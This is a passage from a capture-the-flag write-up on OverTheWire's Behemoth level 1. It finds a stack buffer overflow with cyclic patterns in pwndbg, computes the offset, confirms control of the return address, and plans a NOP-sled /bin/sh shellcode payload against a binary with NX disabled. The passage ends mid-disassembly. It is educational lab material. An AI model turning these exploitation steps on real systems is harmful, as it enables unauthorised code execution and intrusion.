AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>Authentication failure.<br>Sorry.<br>Segmentation fault</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">The program was successfully crashed by sending a large input as can be seen from the &ldquo;Segmentation fault&rdquo; error. This is a strong indicator of a potential buffer overflow vulnerability. </span></p><a id="t.e76d02d1f68f8ce0e7116b8a4dad2b1b17ff6439"></a><a id="t.5"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/1] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c3">$gdb</span><span class="c8">&nbsp;./behemoth1 &nbsp;-q &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>pwndbg: loaded 196 commands. Type pwndbg [filter] </span><span class="c7">for</span><span class="c8">&nbsp;a list. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>pwndbg: created </span><span class="c3">$rebase</span><span class="c8">, </span><span class="c3">$ida</span><span class="c8">&nbsp;gdb </span><span class="c4">functions</span><span class="c8">&nbsp;(can be used with </span><span class="c4">print</span><span class="c8">/</span><span class="c4">break</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Reading symbols from ./behemoth1... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>(No debugging symbols found </span><span class="c7">in</span><span class="c8">&nbsp;./behemoth1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>pwndbg&gt; r &lt; &lt;(cyclic 1000) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /home/0xd4y/business/other/overthewire/behemoth/1/behemoth1 &lt; &lt;(cyclic 1000) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Password: Authentication failure. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Sorry. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Program received signal SIGSEGV, Segmentation fault. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0x61617361 </span><span class="c7">in</span><span class="c8">&nbsp;?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c12"><span class="c32 c16">Note how the cyclic function was used to help determine where the offset is</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>The output confirms the suspicion that this binary is vulnerable to a buffer overflow attack. Looking at the return address at the bottom of the result, it can be seen that the binary is looking for an address of </span><span class="c8">0x61617361</span><span class="c13">. The offset can be calculated using the cyclic -l operation as follows:</span></p><a id="t.a27ffb6d87e362538f596b980d8e3b0ea6ddccc4"></a><a id="t.6"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/1]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c3">$cyclic</span><span class="c8">&nbsp;-l 0x61617361<br>71</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>The offset is the amount of bytes that a binary can take before overwriting the instruction pointer (the register which points to which part of the code should be executed next). Observe from the hex addresses that this is a 32 bit binary. The </span><span class="c29">file</span><span class="c13">&nbsp;command can be used as well to verify this:</span></p><a id="t.7462166d99405876dfc2495be27878787fb835c0"></a><a id="t.7"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/1]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c3">$file</span><span class="c8">&nbsp;behemoth1 <br>behemoth1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, </span><span class="c7">for</span><span class="c8">&nbsp;GNU/Linux 2.6.32, BuildID[sha1]=7e13226f3c05594af2cf29fe34c92cc55047eb94, not stripped</span></p></td></tr></table><p class="c12"><span>This binary is not stripped meaning the debug symbols</span><sup><a href="#ftnt1" id="ftnt_ref1">[1]</a></sup><span>&nbsp;of the binary can be gathered. Additionally, the binary&rsquo;s security can be analyzed with the </span><span class="c29">checksec</span><span class="c13">&nbsp;command: </span></p><p class="c12"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 197.33px;"><img alt="" src="images/image13.png" style="width: 624.00px; height: 197.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c13">Seeing as this binary has NX (non-execute) disabed, shellcode can be written into memory and the binary will execute it (provided that the payload is formatted correctly). With the knowledge that arbitrary code can be executed and that the instruction pointer can be controlled, the binary can be exploited by using shellcode. </span></p><a id="t.aaaea36eb37fe8984ee9976a8211d46fe93aca65"></a><a id="t.8"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">pwndbg&gt; r &lt; &lt;(python -c </span><span class="c0">&quot;print &#39;A&#39;*71+&#39;B&#39;*4&quot;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting program: /home/0xd4y/business/other/overthewire/behemoth/1/behemoth1 &lt; &lt;(python -c </span><span class="c0">&quot;print &#39;A&#39;*71+&#39;B&#39;*4&quot;</span><span class="c8">)<br>Password: Authentication failure. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Sorry. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Program received signal SIGSEGV, Segmentation fault.<br>0x42424242 </span><span class="c7">in</span><span class="c8">&nbsp;?? ()</span></p></td></tr></table><p class="c12"><span class="c16 c32">Note how the return address was successfully controlled (42 is the hex value for B).</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>For the sake of learning more about binary exploitation, I will go over two different methods of pwning:</span><span class="c13">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><h3 class="c19" id="h.vs95uriulwwh"><span class="c25 c22">Method 1</span></h3><p class="c12"><span class="c13">We can create a payload that has the following structure:</span></p><p class="c12"><span class="c29">JUNK_BYTES </span><span>+ </span><span class="c29">ADDRESS_TO_SHELLCODE_</span><span>&nbsp;+ </span><span class="c29">NOP_SLED</span><span>&nbsp;+ </span><span class="c23 c29 c69">SHELLCODE </span></p><p class="c12"><span>Then this payload can be inputted to the binary and it will execute the shellcode. There are many different kinds of shellcodes that can be used, however a simple </span><span class="c29">/bin/sh</span><span>&nbsp;shellcode</span><sup><a href="#ftnt2" id="ftnt_ref2">[2]</a></sup><span class="c13">, which will return a shell upon execution. The next task is to determine where the address of the shellcode will be.</span></p><h4 class="c11" id="h.27qtgfoy0njb"><span class="c44 c22">POC</span></h4><a id="t.6057ad0a1ced4cdccf9de7c32eccce81c501af36"></a><a id="t.9"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">pwndbg&gt; r &lt; &lt;(python -c </span><span class="c0">&quot;print &#39;A&#39;*71+&#39;B&#39;*4+&#39;C&#39;*23&quot;</span><span class="c8">)<br>pwndbg&gt; x/100x </span><span class="c3">$esp</span><span class="c8">-100 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffcfdc: &nbsp; &nbsp; 0x00000000 &nbsp; &nbsp; &nbsp;0xf7fa6000 &nbsp; &nbsp; &nbsp;0xf7fa6000 &nbsp; &nbsp; &nbsp;0xffffd038 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffcfec: &nbsp; &nbsp; 0x08048474 &nbsp; &nbsp; &nbsp;0x0804850c &nbsp; &nbsp; &nbsp;0x41414180 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffcffc: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd00c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd01c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd02c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd03c: &nbsp; &nbsp; 0x42424242 &nbsp; &nbsp; &nbsp;0x43434343 &nbsp; &nbsp; &nbsp;0x43434343 &nbsp; &nbsp; &nbsp;0x43434343 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffd04c: &nbsp; &nbsp; 0x43434343 &nbsp; &nbsp; &nbsp;0x43434343 &nbsp; &nbsp; &nbsp;0x00434343 &nbsp; &nbsp; &nbsp;0xf7fcb410 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c12"><span class="c32 c16">Note A is 41, B is 42, and C is 43 in hex</span></p><p class="c12"><span>Looking at the output of the esp register, the register responsible for pointing to the top of the stack, observe that the shellcode (in this case 43) will start at the second column of 0xffffd03c. Thus the address of the shellcode will be </span><span class="c8">0xffffd03c</span><span class="c13">&nbsp;+ 4 (each column corresponds to 4 bytes) which equals 0xffffd040.</span></p><h4 class="c11" id="h.vkme7fphqreh"><span class="c44 c22">Shellcode Execution</span></h4><p class="c12"><span class="c13">With the knowledge of how buffer overflow attacks work, we can now continue with exploiting the behemoth binary on the target system.</span></p><a id="t.d75336e07eec6e7cf18156a841213d710ed83244"></a><a id="t.10"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) disass main &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Dump of assembler code </span><span class="c7">for</span><span class="c8">&nbsp;</span><span class="c7">function</span><span class="c8">&nbsp;main: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x0804844b &lt;+0&gt;: &nbsp; &nbsp; push &nbsp; %ebp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x0804844c &lt;+1&gt;: &nbsp; &nbsp; mov &nbsp; &nbsp;%esp,%ebp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x0804844e &lt;+3&gt;: &nbsp; &nbsp; sub &nbsp; &nbsp;</span><span class="c3">$0x44</span><span class="c8">,%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x08048451 &lt;+6&gt;: &nbsp; &nbsp; push &nbsp; </span><span class="c3">$0x8048500</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x08048456 &lt;+11&gt;: &nbsp; &nbsp;call &nbsp; 0x8048300 &lt;</span><span class="c4">printf</span><span class="c8">@plt&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 